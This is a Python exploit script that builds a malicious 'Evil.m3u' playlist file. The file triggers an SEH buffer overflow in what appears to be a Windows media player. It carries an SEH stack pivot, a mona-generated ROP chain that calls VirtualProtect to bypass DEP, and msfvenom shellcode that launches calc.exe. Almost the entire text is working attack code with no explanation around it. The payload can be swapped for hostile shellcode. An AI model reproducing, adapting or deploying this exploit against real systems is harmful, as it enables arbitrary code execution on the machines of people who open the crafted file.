#!/usr/bin/env python

import struct

# msfvenom -f c -p windows/exec CMD="C:\windows\system32\calc.exe" -b '\x00\x0a\x0d\x40\x5c'

shellcode = ("\xdb\xdf\xbb\x4a\x50\x5d\xce\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x36\x83\xc5\x04\x31\x5d\x14\x03\x5d\x5e\xb2\xa8\x32\xb6\xb0"
"\x53\xcb\x46\xd5\xda\x2e\x77\xd5\xb9\x3b\x27\xe5\xca\x6e\xcb"
"\x8e\x9f\x9a\x58\xe2\x37\xac\xe9\x49\x6e\x83\xea\xe2\x52\x82"
"\x68\xf9\x86\x64\x51\x32\xdb\x65\x96\x2f\x16\x37\x4f\x3b\x85"
"\xa8\xe4\x71\x16\x42\xb6\x94\x1e\xb7\x0e\x96\x0f\x66\x05\xc1"
"\x8f\x88\xca\x79\x86\x92\x0f\x47\x50\x28\xfb\x33\x63\xf8\x32"
"\xbb\xc8\xc5\xfb\x4e\x10\x01\x3b\xb1\x67\x7b\x38\x4c\x70\xb8"
"\x43\x8a\xf5\x5b\xe3\x59\xad\x87\x12\x8d\x28\x43\x18\x7a\x3e"
"\x0b\x3c\x7d\x93\x27\x38\xf6\x12\xe8\xc9\x4c\x31\x2c\x92\x17"
"\x58\x75\x7e\xf9\x65\x65\x21\xa6\xc3\xed\xcf\xb3\x79\xac\x85"
"\x42\x0f\xca\xeb\x45\x0f\xd5\x5b\x2e\x3e\x5e\x34\x29\xbf\xb5"
"\x71\xc5\xf5\x94\xd3\x4e\x50\x4d\x66\x13\x63\xbb\xa4\x2a\xe0"
"\x4e\x54\xc9\xf8\x3a\x51\x95\xbe\xd7\x2b\x86\x2a\xd8\x98\xa7"
"\x7e\x9b\x24\x04\xf6\x75\x36\xd0\x97\xf2\xb5\x44\x1b\x84\x4a"
"\x01\xbe\x1b\x9f\xdb\x1c\x87\xbe\x77\xfe\x69\x25\xf0\x65\x76")

# modified version of mona VirtualProtect()

#---------------------------------------#
# Register setup for VirtualProtect()   #
#---------------------------------------#
# EAX = NOP (0x90909090)                #
# ECX = lpOldProtect (ptr to W address) #
# EDX = NewProtect (0x40)               #
# EBX = dwSize                          #
# ESP = lPAddress (automatic)           #
# EBP = ReturnTo (ptr to jmp esp)       #
# ESI = ptr to VirtualProtect()         #
# EDI = ROP NOP (RETN)                  #
#---------------------------------------#

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [ 
      0x1004572b,  # POP EAX # POP ESI # RETN [jpeg.dll]
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x41414141,  # Filler (compensate)
      0x66d9d9ba,  # NEG EAX # RETN [avutil-52.dll]
      0x6ab221f9,  # XCHG EAX,EDX # ADD ESP,2C # POP EBP # POP EDI # POP ESI # POP EBX # RETN [swscale-2.dll]
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
	  0x66d97465,  # POP EAX # POP EBX # RETN [avutil-52.dll]
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x41414141,  # Filler (compensate)
      0x66d9d9ba,  # NEG EAX # RETN [avutil-52.dll]
      0x1005020f,  # POP ECX # RETN [jpeg.dll]
      0xffffffff,  #
      0x660166e9,  # INC ECX # SUB AL,0EB # RETN [libiconv-2.dll]
      0x66d8ae48,  # XCHG ECX,EBX # RETN [avutil-52.dll]
      0x1005f6e4,  # ADD EBX,EAX # OR EAX,3000000 # RETN [jpeg.dll]
      0x6ab01cf8,  # POP EDI # RETN [swscale-2.dll]
      0x6ab16202,  # RETN (ROP NOP) [swscale-2.dll]
	  0x100482ff,  # POP EAX # POP EBP # RETN [jpeg.dll]
      0x6ab561b0,  # ptr to &VirtualProtect() [IAT swscale-2.dll]
      0x41414141,  # Filler (compensate)
      0x66dab225,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [avutil-52.dll]
      0x6ab19780,  # XCHG EAX,ESI # RETN [swscale-2.dll]
	  0x6ab0a3bc,  # POP EBP # RETN [swscale-2.dll]
      0x6ab01c06,  # & push esp # ret  [swscale-2.dll]
	  0x6ab3d687,  # POP EAX # POP ECX # RETN [swscale-2.dll]
      0x90909090,  # NOP
      0x41414141,  # Filler (compensate)
	  0x10028125,  # POP ECX # RETN [jpeg.dll]
      0x6ab4e661,  # &Writable location [swscale-2.dll]
      0x6ab2e490,  # PUSHAD # RETN [swscale-2.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

buffer  = 'http://'                     # start of the legitmate .m3u file
buffer += 'A' * 845                     # filler
buffer += 'B' * 4                       # nSEH filler   
buffer += struct.pack('<L', 0x6afc8b93) # SEH # 0x6afc8b93 : {pivot 2892 / 0xb4c} : # ADD ESP,0B3C # POP EBX # POP ESI # POP EDI # POP EBP # RETN | [postproc-52.dll]
buffer += '\x90' * 580                  # filler to where esp would be point after the above gadget
buffer += rop_chain                     # VirtualProtect()
buffer += '\x90' * 20                   # safe net
buffer += shellcode                     # calc.exe 
buffer += '\xcc' * (5000-len(buffer))   # make sure the buffer is 5000 byte long 

try:
	f=open("Evil.m3u","w")
	print "[+] Creating %s bytes evil payload.." %len(buffer)
	f.write(buffer)
	f.close()
	print "[+] File created!"
except Exception as e:
	print e    